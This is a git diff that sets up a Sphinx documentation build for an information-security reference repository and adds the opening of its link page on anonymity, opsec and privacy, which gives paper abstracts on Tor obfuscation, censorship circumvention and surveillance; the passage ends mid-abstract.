-* [Windows Persistence](https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/ATT%26CK-Stuff/Windows/Windows_Persistence.md)
-* [Windows Privilege Escalation](https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/ATT%26CK-Stuff/Windows/Windows_Privilege_Escalation.md)
-
-
-Linux
-* [Linux Collection](https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/ATT%26CK-Stuff/Linux/Linux%20Collection.md)
-* [Linux Command and Control](https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/ATT%26CK-Stuff/Linux/Linux%20Command%20and%20Control.md)
-* [Linux Credential Access](https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/ATT%26CK-Stuff/Linux/Linux%20Credential%20Access.md)
-* [Linux Defense Evasion](https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/ATT%26CK-Stuff/Linux/Linux%20Defense%20Evasion.md)
-* [Linux Discovery](https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/ATT%26CK-Stuff/Linux/Linux%20Discovery.md)
-* [Linux Execution](https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/ATT%26CK-Stuff/Linux/Linux%20Execution.md)
-* [Linux Exfiltration](https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/ATT%26CK-Stuff/Linux/Linux%20Exfiltration.md)
-* [Linux Lateral Movement](https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/ATT%26CK-Stuff/Linux/Linux%20Lateral%20Movement.md)
-* [Linux Persistence](https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/ATT%26CK-Stuff/Linux/Linux%20Persistence.md)
-* [Linux Privilege Escalation](https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/ATT%26CK-Stuff/Linux/Linux%20Privilege%20Escalation.md)
-
-Mac/OS X
-* [OS X Collection]
-* [OS X Command and Control]
-* [OS X Credential Access]
-* [OS X Defense Evasion]
-* [OS X Discovery]
-* [OS X Execution]
-* [OS X Exfiltration]
-* [OS X Lateral Movement]
-* [OS X Persistence]
-* [OS X Privilege Escalation]
-
-#### Categories
-* [Anonymity/OpSec/Privacy](https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/AnonOpsecPrivacy.md)
-* [Basic Security Information](https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/Basic%20Security%20Information.md)
-* [BIOS/UEFI/Firmware Attacks/Defense](https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/BIOS%20UEFI%20Attacks%20Defenses.md)
-* [Building a PenTest Lab](https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/Building%20A%20Pentest%20Lab.md)
-* [Car hacking](https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/Car%20Hacking.md)
-* [Cheat Sheets](https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/Cheat%20sheets%20reference%20pages%20Checklists%20-.md)
-* [CTFs & Wargames](https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/CTFs_Wargames.md)
-* [Conferences/Recordings](https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/Conferences.md)
-* [Counter Surveillance](https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/Counter_Surveillance.md)
-* [Courses & Training](https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/Courses_Training.md)
-* [Cryptography & Encryption](https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/Cryptography%20%26%20Encryption.md)
-* [CryptoCurrencies](https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/CryptoCurrencies.md)
-* [Darknets](https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/Darknets.md)
-* [Data Anaylsis & Visualization](https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/Data%20AnalysisVisualization.md)
-* [Disclosure](https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/Disclosure.md)
-* [Disinformation](https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/Disinformation.md)
-* [Documentation & Reporting](https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/Documentation%20%26%20Reports%20-.md)
-* [Embedded Device Security](https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/Embedded%20Device%20%26%20Hardware%20Hacking%20-.md)
-* [Exfiltration](https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/Exfiltration.md)
-* [Exploit Development](https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/Exploit%20Development.md)
-* [Forensics & Incident Response](https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/Forensics%20Incident%20Response.md)
-* [Fuzzing & Bug Hunting](https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/Fuzzing%20Bug%20Hunting.md)
-* [Gamma Group Hack Writeup](https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/Gamma_group_hack_writeup.txt)
-* [Hacking Team Writeup](https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/Hacking%20Team%20Writeup.md)
-* [Home Security](https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/Home%20Security.md)
-* [Honeypots](https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/Honeypots.md)
-* [Interesting Things & Useful Information](https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/Interesting%20Things%20Useful%20stuff.md)
-* [Malware](https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/Malware.md)
-* [Network Attacks & Defense](https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/Network%20Attacks%20%26%20Defenses.md)
-* [Network Security Monitoring & Logging](https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/Network%20Security%20Monitoring%20%26%20Logging.md)
-* [Open Source Intelligence Gathering - OSINT](https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/Open%20Source%20Intelligence.md)
-* [Opsec Rant #1 - alpraking](https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/Opsec_rant-alpraking.md)
-* [Opsec rant #2 - nachash](https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/Opsec_rant2-nachash.md)
-* [Passwords](https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/Password%20Bruting%20and%20Hashcracking.md)
-* [Phishing](https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/Phishing.md)
-* [Physical Security](https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/Phyiscal%20Security.md)
-* [Privilege Escalation and Post-Exploitation](https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/Privilege%20Escalation%20%26%20Post-Exploitation.md)
-* [Programming Stuff](https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/Programming%20-%20Languages%20Libs%20Courses%20References.md)
-* [Red Teaming](https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/Red-Teaming.md)
-* [Reverse Engineering](https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/Reverse%20Engineering.md)
-* [REMATH Reverse Engineering](https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/Reverse%20Engineering%20-%20REMath%20Literature.md)
-* [Rootkits](https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/Rootkits.md)
-* [Social Engineering](https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/Social%20Engineering.md)
-* [System Internals (Linux/Windows) - NOT THE TOOLSET](https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/System%20Internals%20Windows%20and%20Linux%20Internals%20Reference.md)
-* [Threat Modeling](https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/Threat%20Modeling.md)
-* [Threat Hunting](https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/Threat-Hunting.md)
-* [UI/UX Design](https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/UX%20Design%20-%20Because%20we%20all%20know%20how%20sexy%20pgp%20is.md)
-* [Web](https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/Web%20%26%20Browsers.md)
-* [Wireless Networks and RF Devices](https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/Wireless%20Networks%20%26%20RF.md)
-* [Insurance Data Security Model Law](http://www.naic.org/documents/committees_ex_cybersecurity_tf_exposure_mod_draft_clean.pdf) | 
-* [NIST Cyber Security Framework 02/12/2014](https://www.nist.gov/sites/default/files/documents/cyberframework/cybersecurity-framework-021214.pdf) | 
-* [PCI-DSS V3.2](https://pcicompliance.stanford.edu/sites/default/files/pci_dss_v3-2.pdf)| 
+# Infosec Reference
+
+## Goals:
+
+* Create an awesome Information Security reference
+* To have a comprehensive list of techniques, tools and tactics to learn from/reference.
+  * Something like a "Yellow Pages" in the sense of you know something exists, but what was it called....
+* End goal: Have a rich resource of information security knowledge for anyone to browse through as a jumping off point for various niches OR as a reference/recall method for stuff.
+* Something oppposite to the [MITRE ATT&CK Framework](https://attack.mitre.org/wiki/Main_Page) 
+  * For example, "I want to do priv esc on OS X/windows/linux, what methods are there?" or, "I need to do X under Y situation". Focus is on attacks and how they're done vs how attacks are done with a focus on defense.
+* I'm always accepting more links/stuff. Feel free to contribue or suggest something.
+
+## Screenshots
+
+#### Landing page
+![landing-page](readme-img/landing.png)
+
+#### Sample page
+![sample-page](readme-img/page.png)
+
+### Why Do *I* Care?
+
+* I created this as a resource for myself and to offer it publicly as a way of giving back to the general community.
+* To be clear, these aren't personal notes. I keep this repository maintained as a way of having pointers to information that I feel will help build someone's skill set or increase understanding of attacks/methods/defenses.
+
+### Why Do *You* Care?
+
+* You won't have to constantly google for tools/reminder
+* It's an easily browseable list of tools, techniques, papers, and research in all sorts of areas
+* You want to read some good info
+
+## Installation
+
+* Install `Python 3`
+* Run the terminal command `pip install -r requirements.txt` to install the dependencies for Sphinx
+* Install `yarn`
+* Run the `yarn` to install the dependencies for `prettier`
+
+## Build Commands
+
+To render the Markdown and reStructuredText into HTML, run the terminal command `make html` from the `sphinx/` folder. 
+This will render and output the website to the `build/html/` folder.
+
+To lint your Markdown run `yarn run pretty`. At the moment, this only lints single files. You can lint entire directories using a command like this `find ./src/**/*.js | xargs prettier --write --print-width 80 --single-quote --trailing-comma es5`. More information can be [found here](https://til.hashrocket.com/posts/498b012fbd-run-prettier-on-all-javascript-files-in-a-dir).
+
+## Settings
+
+To edit the settings, change the `source/conf.py` file.
+
+## Structure 
+
+Helpful notes:
+* Use two spaces for indentation
+* Use # for the page title
+
+Pages should have the following structure:
+
+```markdown
+# <title>
+
+## <table of contents>
+
+## <section header>
+
+* bullet point
+* bullet point
+
+  * sub-bullet point
+  
+* bullet point
+
+Normal text looks like this
+
+[Link title](the actual link goes here)
+![image alt text](image link)
+```
+
+## Seeing the latest updates
+
+* For latest content updates, [check the reposity](https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/things-added.md).
diff --git a/_static/.gitsave b/_static/.gitsave
new file mode 100644
index 0000000..e69de29
diff --git a/make.bat b/make.bat
new file mode 100644
index 0000000..50876cc
--- /dev/null
+++ b/make.bat
@@ -0,0 +1,36 @@
+@ECHO OFF
+
+pushd %~dp0
+
+REM Command file for Sphinx documentation
+
+if "%SPHINXBUILD%" == "" (
+	set SPHINXBUILD=sphinx-build
+)
+set SOURCEDIR=source
+set BUILDDIR=build
+set SPHINXPROJ=InfosecReference
+
+if "%1" == "" goto help
+
+%SPHINXBUILD% >NUL 2>NUL
+if errorlevel 9009 (
+	echo.
+	echo.The 'sphinx-build' command was not found. Make sure you have Sphinx
+	echo.installed, then set the SPHINXBUILD environment variable to point
+	echo.to the full path of the 'sphinx-build' executable. Alternatively you
+	echo.may add the Sphinx directory to PATH.
+	echo.
+	echo.If you don't have Sphinx installed, grab it from
+	echo.http://sphinx-doc.org/
+	exit /b 1
+)
+
+%SPHINXBUILD% -M %1 %SOURCEDIR% %BUILDDIR% %SPHINXOPTS%
+goto end
+
+:help
+%SPHINXBUILD% -M help %SOURCEDIR% %BUILDDIR% %SPHINXOPTS%
+
+:end
+popd
diff --git a/package-lock.json b/package-lock.json
new file mode 100644
index 0000000..71264e7
--- /dev/null
+++ b/package-lock.json
@@ -0,0 +1,53 @@
+{
+  "requires": true,
+  "lockfileVersion": 1,
+  "dependencies": {
+    "mdast-comment-marker": {
+      "version": "1.0.2",
+      "resolved": "https://registry.npmjs.org/mdast-comment-marker/-/mdast-comment-marker-1.0.2.tgz",
+      "integrity": "sha1-Hd8O+BH7UkOQF8jSwLkiA18rp0o="
+    },
+    "remark-lint": {
+      "version": "6.0.1",
+      "resolved": "https://registry.npmjs.org/remark-lint/-/remark-lint-6.0.1.tgz",
+      "integrity": "sha512-wvTTuB5O5pF8SxqahQjjrU3dtuhygYjaGcOZTw+4ACgSE4RBINDlNqN46HjcV3X0ib5GmObJUt5a2mmhtmuTqw==",
+      "requires": {
+        "remark-message-control": "4.0.1"
+      }
+    },
+    "remark-message-control": {
+      "version": "4.0.1",
+      "resolved": "https://registry.npmjs.org/remark-message-control/-/remark-message-control-4.0.1.tgz",
+      "integrity": "sha1-KRPNYLMW2fnzkKp/NGOdIM9VmW0=",
+      "requires": {
+        "mdast-comment-marker": "1.0.2",
+        "trim": "0.0.1",
+        "unist-util-visit": "1.2.0",
+        "vfile-location": "2.0.2"
+      }
+    },
+    "trim": {
+      "version": "0.0.1",
+      "resolved": "https://registry.npmjs.org/trim/-/trim-0.0.1.tgz",
+      "integrity": "sha1-WFhUf2spB1fulczMZm+1AITEYN0="
+    },
+    "unist-util-is": {
+      "version": "2.1.1",
+      "resolved": "https://registry.npmjs.org/unist-util-is/-/unist-util-is-2.1.1.tgz",
+      "integrity": "sha1-DDEmKeP5YMZukx6BLT2A53AQlHs="
+    },
+    "unist-util-visit": {
+      "version": "1.2.0",
+      "resolved": "https://registry.npmjs.org/unist-util-visit/-/unist-util-visit-1.2.0.tgz",
+      "integrity": "sha512-lI+jyPlDztHZ2CJhUchcRMQ7MNc0yASgYFxwRTxs0EZ+9HbYFBLVGDJ2FchTBy+pra0O1LVEn0Wkgf19mDVDzw==",
+      "requires": {
+        "unist-util-is": "2.1.1"
+      }
+    },
+    "vfile-location": {
+      "version": "2.0.2",
+      "resolved": "https://registry.npmjs.org/vfile-location/-/vfile-location-2.0.2.tgz",
+      "integrity": "sha1-02dcWch3SY5JK0dW/2Xkrxp1IlU="
+    }
+  }
+}
diff --git a/package.json b/package.json
new file mode 100644
index 0000000..d5f618c
--- /dev/null
+++ b/package.json
@@ -0,0 +1,8 @@
+{
+  "scripts": {
+    "prettier": "prettier --write ./source/Network-Attacks-Defenses.md"
+  },
+  "devDependencies": {
+    "prettier": "^1.8.2"
+  }
+}
diff --git a/readme-img/landing.png b/readme-img/landing.png
new file mode 100644
index 0000000..1471767
Binary files /dev/null and b/readme-img/landing.png differ
diff --git a/readme-img/page.png b/readme-img/page.png
new file mode 100644
index 0000000..77eefb5
Binary files /dev/null and b/readme-img/page.png differ
diff --git a/requirements.txt b/requirements.txt
new file mode 100644
index 0000000..5686b71
--- /dev/null
+++ b/requirements.txt
@@ -0,0 +1,20 @@
+alabaster==0.7.10
+Babel==2.5.1
+certifi==2017.11.5
+chardet==3.0.4
+CommonMark==0.5.4
+docutils==0.14
+idna==2.6
+imagesize==0.7.1
+Jinja2==2.10
+MarkupSafe==1.0
+Pygments==2.2.0
+pytz==2017.3
+recommonmark==0.4.0
+requests==2.18.4
+six==1.11.0
+snowballstemmer==1.2.1
+Sphinx==1.6.5
+sphinx-rtd-theme==0.2.4
+sphinxcontrib-websupport==1.0.1
+urllib3==1.22
diff --git a/source/Anon-Opsec-Privacy.md b/source/Anon-Opsec-Privacy.md
new file mode 100644
index 0000000..dc6e247
--- /dev/null
+++ b/source/Anon-Opsec-Privacy.md
@@ -0,0 +1,453 @@
+## Anonymity, Opsec & Privacy
+
+#### Table of Contents
+
+* [Cull](#cull)
+* [General](#general)
+* [Blogposts](#blog)
+* [Articles](#Articles)
+* [How-Tos](#howtos)
+* [Papers](#Papers)
+* [Talks/Videos](#talks)
+* [Tools](#Tools)
+* [Miscellaneous](#misc)
+
+#### Cull
+
+* [Technical analysis of client identification mechanisms](http://www.chromium.org/Home/chromium-security/client-identification-mechanisms)
+* [Client Identification Mechanisms](http://www.chromium.org/Home/chromium-security/client-identification-mechanisms)
+
+#### General
+
+* [OS X Security and Privacy Guide](https://github.com/drduh/OS-X-Security-and-Privacy-Guide)
+* [Bugger - Adam Curtis](http://www.bbc.co.uk/blogs/adamcurtis/entries/3662a707-0af9-3149-963f-47bea720b460)
+
+  * Maybe the real state secret is that spies aren't very good at their jobs and
+    don't know much about the world
+
+* [Mobile Phone Data lookup](https://medium.com/@philipn/want-to-see-something-crazy-open-this-link-on-your-phone-with-wifi-turned-off-9e0adb00d024)
+
+#### Blogposts
+
+* [De-Anonymizing Alt.Anonymous.Messages](https://ritter.vg/blog-deanonymizing_amm.html)
+* [Defeating and Detecting Browser Spoofing - Browserprint](https://browserprint.info/blog/defeatingSpoofing)
+* [Invasion of Privacy - HackerFactor](http://www.hackerfactor.com/blog/index.php?/archives/703-Invasion-of-Privacy.html)
+* [Trawling Tor Hidden Service – Mapping the DHT](https://donncha.is/2013/05/trawling-tor-hidden-services/)
+* [China travel laptop setup](https://mricon.com/i/travel-laptop-setup.html?t=1&cn=ZmxleGlibGVfcmVjcw%3D%3D&iid=88d246896d384d5292f51df954a2c8ba&uid=150127534&nid=244+272699400)
+* [Operational Security and the Real World - The Grugq](https://medium.com/@thegrugq/operational-security-and-the-real-world-3c07e7eeb2e8)
+* [CIA Vault7 Development Tradecraft DOs and DON'Ts](https://wikileaks.org/ciav7p1/cms/page_14587109.html)
+* [Dutch-Russian cyber crime case reveals how police tap the internet - ElectroSpaces](http://electrospaces.blogspot.de/2017/06/dutch-russian-cyber-crime-case-reveals.html?m=1)
+* [Deanonymizing Windows users and capturing Microsoft and VPN accounts](https://medium.com/@ValdikSS/deanonymizing-windows-users-and-capturing-microsoft-and-vpn-accounts-f7e53fe73834)
+* [The Paranoid's Bible: An anti-dox effort.](https://paranoidsbible.tumblr.com/)
+* [Debian-Privacy-Server-Guide](https://github.com/drduh/Debian-Privacy-Server-Guide)
+
+  * This is a step-by-step guide to configuring and managing a domain, remote
+    server and hosted services, such as VPN, a private and obfuscated Tor
+    bridge, and encrypted chat, using the Debian GNU/Linux operating system and
+    other free software.
+
+* [Reminder: Oh, Won't You Please Shut Up? - USA](https://www.popehat.com/2011/12/01/reminder-oh-wont-you-please-shut-up/)
+
+#### Articles
+
+* [De-anonymizing facebook users through CSP](http://www.myseosolution.de/deanonymizing-facebook-users-by-csp-bruteforcing/#inhaltsverzeichnis)
+* [Anonymous’s Guide to OpSec](http://www.covert.io/research-papers/security/Anonymous%20Hacking%20Group%20--%20OpNewblood-Super-Secret-Security-Handbook.pdf)
+* [Cat Videos and the Death of Clear Text](https://citizenlab.org/2014/08/cat-video-and-the-death-of-clear-text/)
+* [How to Spot a SpoCTok](https://cryptome.org/dirty-work/spot-spook.htm)
+* [China travel laptop setup](https://mricon.com/i/travel-laptop-setup.html?t=1&cn=ZmxleGlibGVfcmVjcw%3D%3D&iid=88d246896d384d5292f51df954a2c8ba&uid=150127534&nid=244+272699400)
+* [Operational Security and the Real World - The Grugq](https://medium.com/@thegrugq/operational-security-and-the-real-world-3c07e7eeb2e8)
+* [Protecting Your Sources When Releasing Sensitive Documents](https://source.opennews.org/articles/how-protect-your-sources-when-releasing-sensitive-/)
+* [Bugger - Adam Curtis](http://www.bbc.co.uk/blogs/adamcurtis/entries/3662a707-0af9-3149-963f-47bea720b460)
+
+  * Maybe the real state secret is that spies aren't very good at their jobs and
+    don't know much about the world
+
+* [Detect Tor Exit doing sniffing by passively detecting unique DNS query (via HTML & PCAP parsing/viewing)](https://github.com/NullHypothesis/exitmap/issues/37)
+* [Managing Pseudonyms with Compartmentalization: Identity Management of Personas](https://www.alienvault.com/blogs/security-essentials/managing-pseudonyms-with-compartmentalization-identity-management-of-personas)
+* [Data release: list of websites that have third-party “session replay” scripts ](https://webtransparency.cs.princeton.edu/no_boundaries/session_replay_sites.html)
+* [No boundaries: Exfiltration of personal data by session-replay scripts](https://freedom-to-tinker.com/2017/11/15/no-boundaries-exfiltration-of-personal-data-by-session-replay-scripts/)
+
+#### How-Tos
+
+* [How to stop Firefox from making automatic connections](https://support.mozilla.org/en-US/kb/how-stop-firefox-making-automatic-connections)
+
+#### Papers
+
+* [Protocol Misidentification Made Easy with Format-Transforming Encryption](https://eprint.iacr.org/2012/494.pdf)
+
+  * Deep packet inspection DPI technologies provide much- needed visibility and
+    control of network traffic using port- independent protocol identification,
+    where a network ow is labeled with its application-layer protocol based on
+    packet contents. In this paper, we provide the most comprehensive evaluation
+    of a large set of DPI systems from the point of view of protocol
+    misidentification attacks, in which adver- saries on the network attempt to
+    force the DPI to mislabel connections. Our approach uses a new cryptographic
+    primitive called format-transforming encryption FTE, which extends
+    conventional symmetric encryption with the ability to transform the
+    ciphertext into a format of our choosing. We design an FTE-based record
+    layer that can encrypt arbi- trary application-layer traffic, and we
+    experimentally show that this forces misidentification for all of the
+    evaluated DPI systems. This set includes a proprietary, enterprise-class DPI
+    system used by large corporations and nation-states. We also show that using
+    FTE as a proxy system incurs no latency overhead and as little as 16%
+    bandwidth overhead compared to standard SSH tunnels. Finally, we integrate
+    our FTE proxy into the Tor anonymity network and demonstrate that it evades
+    real-world censorship by the Great Firewall of China.
+
+* ['I've Got Nothing to Hide' and Other Misunderstandings of Privacy](http://papers.ssrn.com/sol3/papers.cfm?abstract_id=998565&)
+
+  * We live in a surveillance state. Law enforcement and intelligence agencies
+    have access to a huge amount of data about us, enabling them to learn
+    intimate, private details about our lives. In part, the ease with which they
+    can obtain such information reflects the fact that our laws have failed to
+    keep up with advances in technology. However, privacy enhancing technologies
+    can offer real protections even when the law does not. That intelligence
+    agencies like the NSA are able to collect records about every telephone call
+    made in the United States, or engage in the bulk surveillance of Internet
+    communications is only possible because so much of our data is transmitted
+    in the clear. The privacy enhancing technologies required to make bulk
+    surveillance impossible and targeted surveillance more difficult already
+    exist. We just need to start using them.
+
+* [Masquerade: How a Helpful Man-in-the-Middle Can Help You Evade Monitoring\** - Defcon22](https://www.youtube.com/watch?v=_KyfJW2lHtk&spfreload=1)
+
+  * Sometimes, hiding the existence of a communication is as important as hiding
+    the contents of that communication. While simple network tunneling such as
+    Tor or a VPN can keep the contents of communications confidential, under
+    active network monitoring or a restrictive IDS such tunnels are red flags
+    which can subject the user to extreme scrutiny. Format-Transforming
+    Encryption FTE can be used to tunnel traffic within otherwise innocuous
+    protocols, keeping both the contents and existence of the sensitive traffic
+    hidden. However, more advanced automated intrusion detection, or moderately
+    sophisticated manual inspection, raise other red flags when a host reporting
+    to be a laser printer starts browsing the web or opening IM sessions, or
+    when a machine which appears to be a Mac laptop sends network traffic using
+    Windows-specific network settings. We present Masquerade: a system which
+    combines FTE and host OS profile selection to allow the user to emulate a
+    user-selected operating system and application-set in network traffic and
+    settings, evading both automated detection and frustrating after-the-fact
+    analysis.
+  * [Slides](https://www.portalmasq.com/portal-defcon.pdf)
+
+* [The NSA: Capabilities and Countermeasures\** - Bruce Schneier - ShmooCon 2014](https://www.youtube.com/watch?v=D5JA8Ytk9EI)
+
+  * Edward Snowden has given us an unprecedented window into the NSA's
+    surveillance activities. Drawing from both the Snowden documents and
+    revelations from previous whistleblowers, I will describe the sorts of
+    surveillance the NSA does and how it does it. The emphasis is on the
+    technical capabilities of the NSA, not the politics of their actions. This
+    includes how it conducts Internet surveillance on the backbone, but is
+    primarily focused on their offensive capabilities: packet injection attacks
+    from the Internet backbone, exploits against endpoint computers and implants
+    to exfiltrate information, fingerprinting computers through cookies and
+    other means, and so on. I will then talk about what sorts of countermeasures
+    are likely to frustrate the NSA. Basically, these are techniques to raise
+    the cost of wholesale surveillance in favor of targeted surveillance:
+    encryption, target hardening, dispersal, and so on.
+
+* [You're Leaking Trade Secrets - Defcon22 Michael Schrenk](https://www.youtube.com/watch?v=JTd5TL6_zgY)
+
+  * Networks don't need to be hacked for information to be compromised. This is
+    particularly true for organizations that are trying to keep trade secrets.
+    While we hear a lot about personal privacy, little is said in regard to
+    organizational privacy. Organizations, in fact, leak information at a much
+    greater rate than individuals, and usually do so with little fanfare. There
+    are greater consequences for organizations when information is leaked
+    because the secrets often fall into the hands of competitors. This talk uses
+    a variety of real world examples to show how trade secrets are leaked
+    online, and how organizational privacy is compromised by seemingly innocent
+    use of The Internet.
+
+* [Deep-Spying: Spying using Smartwatch and Deep Learning - Tony Beltramelli](https://arxiv.org/pdf/1512.05616v1.pdf)
+* [HORNET: High-speed Onion Routing at the Network Layer](http://arxiv.org/pdf/1507.05724v1.pdf)
+* [Decoy Routing: Toward Unblockable Internet Communication](https://www.usenix.org/legacy/events/foci11/tech/final_files/Karlin.pdf)
+
+  * We present decoy routing, a mechanism capable of cir- cumventing common
+    network filtering strategies. Unlike other circumvention techniques, decoy
+    routing does not require a client to connect to a specific IP address (which
+    is easily blocked) in order to provide circumvention. We show that if it is
+    possible for a client to connect to any unblocked host/service, then decoy
+    routing could be used to connect them to a blocked destination without coop-
+    eration from the host. This is accomplished by placing the circumvention
+    service in the network itself – where a single device could proxy traffic
+    between a significant fraction of hosts – instead of at the edge.
+
+* [obfs4 (The obfourscator)](https://gitweb.torproject.org/pluggable-transports/obfs4.git/tree/doc/obfs4-spec.txt)
+
+  * This is a protocol obfuscation layer for TCP protocols. Its purpose is to
+    keep a third party from telling what protocol is in use based on message
+    contents. Unlike obfs3, obfs4 attempts to provide authentication and data
+    integrity, though it is still designed primarily around providing a layer of
+    obfuscation for an existing authenticated protocol like SSH or TLS.
+
+* [obfs3 (The Threebfuscator)](https://gitweb.torproject.org/pluggable-transports/obfsproxy.git/tree/doc/obfs3/obfs3-protocol-spec.txt)
+
+  * This is a protocol obfuscation layer for TCP protocols. Its purpose is to
+    keep a third party from telling what protocol is in use based on message
+    contents. Like obfs2, it does not provide authentication or data integrity.
+    It does not hide data lengths. It is more suitable for providing a layer of
+    obfuscation for an existing authenticated protocol, like SSH or TLS.
+
+* [StegoTorus: A Camouflage Proxy for the Tor Anonymity System](https://research.owlfolio.org/pubs/2012-stegotorus.pdf)
+
+  * Internet censorship by governments is an increasingly common practice
+    worldwide. Internet users and censors are locked in an arms race: as users
+    find ways to evade censorship schemes, the censors develop countermeasures
+    for the evasion tactics. One of the most popular and effective circumvention
+    tools, Tor, must regularly adjust its network traffic signature to remain
+    usable. We present StegoTorus, a tool that comprehensively disguises Tor
+    from protocol analysis. To foil analysis of packet contents, Tor’s traffic
+    is steganographed to resemble an innocuous cover protocol, such as HTTP. To
+    foil analysis at the transport level, the Tor circuit is distributed over
+    many shorter-lived connections with per-packet characteristics that mimic
+    cover-protocol traffic. Our evaluation demonstrates that StegoTorus improves
+    the resilience of Tor to fingerprinting attacks and delivers usable
+    performance.
+
+* [SkypeMorph: Protocol Obfuscation for Tor Bridges](https://www.cypherpunks.ca/~iang/pubs/skypemorph-ccs.pdf)
+
+  * The Tor network is designed to provide users with low- latency anonymous
+    communications. Tor clients build circuits with publicly listed relays to
+    anonymously reach their destinations. However, since the relays are publicly
+    listed, they can be easily blocked by censoring adversaries. Consequently,
+    the Tor project envisioned the possibility of unlisted entry points to the
+    Tor network, commonly known as bridges. We address the issue of preventing
+    censors from detecting the bridges by observing the communications between
+    them and nodes in their network. We propose a model in which the client
+    obfuscates its messages to the bridge in a widely used protocol over the
+    Inter- net. We investigate using Skype video calls as our target protocol
+    and our goal is to make it difficult for the censor- ing adversary to
+    distinguish between the obfuscated bridge connections and actual Skype calls
+    using statistical compar- isons. We have implemented our model as a
+    proof-of-concept pluggable transport for Tor, which is available under an
+    open-source licence. Using this implementation we observed the obfuscated
+    bridge communications and compared it with those of Skype calls and
+    presented the results.
+
+* [Protocol Misidentification Made Easy with Format-Transforming Encryption](https://kpdyer.com/publications/ccs2013-fte.pdf)
+
+  * Deep packet inspection (DPI) technologies provide much needed visibility and
+    control of network traffic using port- independent protocol identification,
+    where a network flow is labeled with its application-layer protocol based on
+    packet contents. In this paper, we provide the first comprehensive
+    evaluation of a large set of DPI systems from the point of view of protocol
+    misidentification attacks, in which adver- saries on the network attempt to
+    force the DPI to mislabel connections. Our approach uses a new cryptographic
+    prim- itive called format-transforming encryption (FTE), which extends
+    conventional symmetric encryption with the ability to transform the
+    ciphertext into a format of our choosing. We design an FTE-based record
+    layer that can encrypt arbitrary application-layer traffic, and we
+    experimentally show that this forces misidentification for all of the
+    evaluated DPI systems. This set includes a proprietary, enterprise-class DPI
+    system used by large corporations and nation-states. We also show that using
+    FTE as a proxy system incurs no latency overhead and as little as 16%
+    bandwidth overhead compared to standard SSH tunnels. Finally, we integrate
+    our FTE proxy into the Tor anonymity network and demon- strate that it
+    evades real-world censorship by the Great Fire- wall of China
+
+* [Cirripede: Circumvention Infrastructure using Router Redirection with Plausible Deniability](http://hatswitch.org/~nikita/papers/cirripede-ccs11.pdf)
+
+  * Many users face surveillance of their Internet communications and a
+    significant fraction suffer from outright blocking of certain destinations.
+    Anonymous communication systems allow users to conceal the destinations they
+    communicate with, but do not hide the fact that the users are using them.
+    The mere use of such systems may invite suspicion, or access to them may be
+    blocked. We therefore propose Cirripede, a system that can be used for
+    unobservable communication with Internet destinations. Cirripede is designed
+    to be deployed by ISPs; it intercepts connections from clients to
+    innocent-looking desti- nations and redirects them to the true destination
+    requested by the client. The communication is encoded in a way that is
+    indistinguishable from normal communications to anyone without the master
+    secret key, while public-key cryptogra- phy is used to eliminate the need
+    for any secret information that must be shared with Cirripede users.
+    Cirripede is designed to work scalably with routers that handle large
+    volumes of traffic while imposing minimal over- head on ISPs and not
+    disrupting existing traffic. This allows Cirripede proxies to be
+    strategically deployed at central lo- cations, making access to Cirripede
+    very difficult to block. We built a proof-of-concept implementation of
+    Cirripede and performed a testbed evaluation of its performance proper- ties
+
